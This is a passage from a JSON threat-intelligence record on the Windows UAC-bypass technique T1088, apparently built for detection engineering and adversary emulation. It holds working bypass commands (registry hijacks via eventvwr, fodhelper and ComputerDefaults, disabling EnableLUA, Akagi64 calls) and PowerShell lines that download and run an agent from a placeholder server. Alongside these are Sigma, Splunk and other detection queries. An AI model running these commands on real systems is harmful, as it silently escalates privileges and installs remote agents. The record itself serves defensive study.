\"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payload": "Bypass-UAC.ps1"}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payload": "Akagi64.exe"}}}, "eventvwr.exe", "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "eventvwr.exe", "mshta.exe", "verclsid.exe", "winword.exe", "verclsid.exe", "*.exe reg query", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command", "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "\\Software\\Classes\\ms-settings\\shell\\open\\command", "\\Software\\Classes\\ms-settings\\shell\\open\\command", "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe", "powershell/privesc/ask", "powershell/privesc/ask", "powershell/privesc/bypassuac", "powershell/privesc/bypassuac", "powershell/privesc/bypassuac_eventvwr", "powershell/privesc/bypassuac_eventvwr", "powershell/privesc/bypassuac_wscript", "powershell/privesc/bypassuac_wscript", "powershell/privesc/bypassuac_env", "powershell/privesc/bypassuac_env", "powershell/privesc/bypassuac_fodhelper", "powershell/privesc/bypassuac_fodhelper", "powershell/privesc/bypassuac_sdctlbypass", "powershell/privesc/bypassuac_sdctlbypass", "powershell/privesc/bypassuac_tokenmanipulation", "powershell/privesc/bypassuac_tokenmanipulation"], "technique_id": "T1088", "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1088", "Built-in Windows Command": "", "Cobalt Strike": "uacbypass", "Description": "If you have a medium integrity process, but are an administrator, UACBypass will get you a high integrity process without prompting the user for confirmation.", "Metasploit": "One of the following:\nexploit/windows/local/bypassuac\nexploit/windows/local/bypassuac_injection\nexploit/windows/local/bypassuac_vbs"}}, {"Atomic Red Team Test - Bypass User Account Control": {"display_name": "Bypass User Account Control", "atomic_tests": [{"description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n", "supported_platforms": ["windows"], "name": "Bypass UAC using Event Viewer", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n", "name": "command_prompt", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f\n"}}, {"description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n", "supported_platforms": ["windows"], "name": "Bypass UAC using Event Viewer - PowerShell", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n"}}, {"description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\n", "supported_platforms": ["windows"], "name": "Bypass UAC using Fodhelper", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"elevation_required": false, "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\"\nfodhelper.exe\n", "name": "command_prompt", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f\n"}}, {"description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\n", "supported_platforms": ["windows"], "name": "Bypass UAC using Fodhelper - PowerShell", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"elevation_required": false, "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"}}, {"description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\n", "supported_platforms": ["windows"], "name": "Bypass UAC using ComputerDefaults - PowerShell", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"elevation_required": false, "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "name": "powershell", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"}}, {"description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems, however the directory structure will be created.\n", "supported_platforms": ["windows"], "name": "Bypass UAC by Mocking Trusted Directories", "input_arguments": {"executable_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Binary to execute with UAC Bypass"}}, "executor": {"elevation_required": true, "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "name": "command_prompt", "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q\ndel \"c:\\testbypass.exe\" >nul 2>nul \n"}}], "attack_technique": "T1088"}}, {"Mitre Stockpile - Set a registry key to allow UAC bypass": {"platforms": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "description": "Set a registry key to allow UAC bypass", "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "name": "UAC bypass registry"}}, {"Mitre Stockpile - Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe": {"platforms": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, "name": "wow64log DLL Hijack", "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "id": "95ad5d69-563e-477b-802b-4855bfb3be09", "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe"}}, {"Mitre Stockpile - executes the slui exe file handler hijack": {"platforms": {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payload": "Akagi64.exe"}}}, "name": null, "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "id": "b7344901-0b02-4ead-baf6-e3f629ed545f", "description": "executes the slui exe file handler hijack"}}, {"Mitre Stockpile - Bypass user account controls - medium": {"platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payload": "Bypass-UAC.ps1"}}}, "description": "Bypass user account controls - medium", "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "name": "Bypass UAC Medium"}}, {"Mitre Stockpile - UIPI bypass with uiAccess application": {"platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payload": "Akagi64.exe"}}}, "name": "duser/osksupport DLL Hijack", "tactic": "privilege-escalation", "technique": {"attack_id": "T1088", "name": "Bypass User Account Control"}, "id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "description": "UIPI bypass with uiAccess application"}}, {"Threat Hunting Tables": {"mitre_attack": "T1088", "file_value": "", "file_path": "", "parent_process": "eventvwr.exe", "itw_sample": "", "chain_id": "100012", "registry_value": "", "mitre_caption": "bypass_uac", "registry_path": "HKEY_USERS\\*\\mscfile\\shell\\open\\command", "frequency": "high", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1088", "file_value": "", "file_path": "", "parent_process": "eventvwr.exe", "itw_sample": "", "chain_id": "100024", "registry_value": "", "mitre_caption": "bypass_uac", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1088", "file_value": "", "file_path": "", "parent_process": "mshta.exe", "itw_sample": "https://www.redcanary.com/blog/verclsid-exe-threat-detection/", "chain_id": "100047", "registry_value": "", "mitre_caption": "bypass_uac", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "verclsid.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1088", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100096", "registry_value": "", "mitre_caption": "bypass_uac", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "verclsid.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1088", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100203", "registry_value": "", "mitre_caption": "bypass_uac", "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths", "frequency": "high", "commandline_string": "reg query", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1088": {"phase": "Privilege Escalation", "query": [{"type": "reg", "reg": {"path": {"pattern": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command"}}}, {"process": {"cmdline": {"pattern": "Software\\Classes\\mscfile\\shell\\open\\command|mscfile\\shell\\open\\command"}}, "type": "process"}, {"type": "reg", "reg": {"path": {"pattern": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand"}}}, {"process": {"cmdline": {"pattern": "\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe|\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand"}}, "type": "process"}, {"type": "reg", "reg": {"path": {"pattern": "\\Software\\Classes\\ms-settings\\shell\\open\\command"}}}, {"process": {"cmdline": {"pattern": "\\Software\\Classes\\ms-settings\\shell\\open\\command"}}, "type": "process"}, {"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe"}}}, {"process": {"cmdline": {"pattern": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe"}}, "type": "process"}], "description": null, "name": "UAC bypass", "level": "high"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/ask", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/ask\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_eventvwr", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_eventvwr\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_wscript", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_wscript\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_env", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_env\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_fodhelper", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_fodhelper\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_sdctlbypass", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_sdctlbypass\":  [\"T1088\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1088", "Empire Module": "powershell/privesc/bypassuac_tokenmanipulation", "Technique": "Bypass User Account Control", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/privesc/bypassuac_tokenmanipulation\":  [\"T1088\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"eventvwr.exe\"or process_parent_command_line contains \"fodhelper.exe\"or process_path contains \"ShellRunas.exe\")", "product": "Azure Sentinel", "name": "Bypass User Account Control Process"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\mscfile\\\\shell\\\\open\\\\command\\\\*\"or registry_key_path contains \"*\\\\ms-settings\\\\shell\\\\open\\\\command\\\\*\")", "product": "Azure Sentinel", "name": "Bypass User Account Control Registry"}, {"query": "title: UAC Bypass via Event Viewer\nid: 7c81fec3-1c1d-43b0-996a-46753041b1b6\nstatus: experimental\ndescription: Detects UAC bypass method using Windows event viewer\nreferences:\n    - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n    - https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    methregistry:\n        EventID: 13\n        TargetObject: 'HKEY_USERS\\\\*\\mscfile\\shell\\open\\command'\n    methprocess:\n        EventID: 1 # Migration to process_creation requires multipart YAML\n        ParentImage: '*\\eventvwr.exe'\n    filterprocess:\n        Image: '*\\mmc.exe'\n    condition: methregistry or ( methprocess and not filterprocess )\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: UAC Bypass via Event Viewer\nid: 7c81fec3-1c1d-43b0-996a-46753041b1b6\nstatus: experimental\ndescription: Detects UAC bypass method using Windows event viewer\nreferences:\n    - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n    - https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    methregistry:\n        EventID: 13\n        TargetObject: 'HKEY_USERS\\\\*\\mscfile\\shell\\open\\command'\n    methprocess:\n        EventID: 1 # Migration to process_creation requires multipart YAML\n        ParentImage: '*\\eventvwr.exe'\n    filterprocess:\n        Image: '*\\mmc.exe'\n    condition: methregistry or ( methprocess and not filterprocess )\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"13\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\*\\\\\\\\mscfile\\\\\\\\shell\\\\\\\\open\\\\\\\\command) OR ((EventID:\"1\" AND ParentImage.keyword:*\\\\\\\\eventvwr.exe) AND (NOT (Image.keyword:*\\\\\\\\mmc.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/UAC-Bypass-via-Event-Viewer <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"UAC Bypass via Event Viewer\",\\n    \"description\": \"Detects UAC bypass method using Windows event viewer\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1088\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"13\\\\\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\mscfile\\\\\\\\\\\\\\\\shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command) OR ((EventID:\\\\\"1\\\\\" AND ParentImage.keyword:*\\\\\\\\\\\\\\\\eventvwr.exe) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\mmc.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"13\\\\\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\mscfile\\\\\\\\\\\\\\\\shell\\\\\\\\\\\\\\\\open\\\\\\\\\\\\\\\\command) OR ((EventID:\\\\\"1\\\\\" AND ParentImage.keyword:*\\\\\\\\\\\\\\\\eventvwr.exe) AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\mmc.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'UAC Bypass via Event Viewer\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"13\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\*\\\\\\\\mscfile\\\\\\\\shell\\\\\\\\open\\\\\\\\command) OR ((EventID:\"1\" AND ParentImage.keyword:*\\\\\\\\eventvwr.exe) AND (NOT (Image.keyword:*\\\\\\\\mmc.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"13\" TargetObject=\"HKEY_USERS\\\\\\\\*\\\\\\\\mscfile\\\\\\\\shell\\\\\\\\open\\\\\\\\command\") OR ((EventID=\"1\" ParentImage=\"*\\\\\\\\eventvwr.exe\") NOT (Image=\"*\\\\\\\\mmc.exe\"))) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"13\" TargetObject=\"HKEY_USERS\\\\\\\\*\\\\\\\\mscfile\\\\\\\\shell\\\\\\\\open\\\\\\\\command\") OR ((event_id=\"1\" ParentImage=\"*\\\\\\\\eventvwr.exe\")  -(Image=\"*\\\\\\\\mmc.exe\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*13)(?=.*HKEY_USERS\\\\\\\\.*\\\\mscfile\\\\shell\\\\open\\\\command))|.*(?:.*(?=.*(?:.*(?=.*1)(?=.*.*\\\\eventvwr\\\\.exe)))(?=.*(?!.*(?:.*(?=.*.*\\\\mmc\\\\.exe)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: UAC Bypass via sdclt\nid: 5b872a46-3b90-45c1-8419-f675db8053aa\nstatus: experimental\ndescription: Detects changes to HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand\nreferences:\n    - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\nauthor: Omer Yampel\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13 \n        TargetObject: 'HKEY_USERS\\\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand'\n    condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: UAC Bypass via sdclt\nid: 5b872a46-3b90-45c1-8419-f675db8053aa\nstatus: experimental\ndescription: Detects changes to HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand\nreferences:\n    - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\nauthor: Omer Yampel\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 13 \n        TargetObject: 'HKEY_USERS\\\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand'\n    condition: selection\ntags:\n    - attack.defense_evasion\n    - attack.privilege_escalation\n    - attack.t1088\n    - car.2019-04-001\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\*\\\\\\\\Classes\\\\\\\\exefile\\\\\\\\shell\\\\\\\\runas\\\\\\\\command\\\\\\\\isolatedCommand)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/UAC-Bypass-via-sdclt <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"UAC Bypass via sdclt\",\\n    \"description\": \"Detects changes to HKCU:\\\\\\\\Software\\\\\\\\Classes\\\\\\\\exefile\\\\\\\\shell\\\\\\\\runas\\\\\\\\command\\\\\\\\isolatedCommand\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1088\",\\n      \"car.2019-04-001\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:HKEY_USERS\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\Classes\\\\\\\\\\\\\\\\exefile\\\\\\\\\\\\\\\\shell\\\\\\\\\\\\\\\\runas\\\\\\\\\\\\\\\\command\\\\\\\\\\\\\\\\isolatedCommand)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND 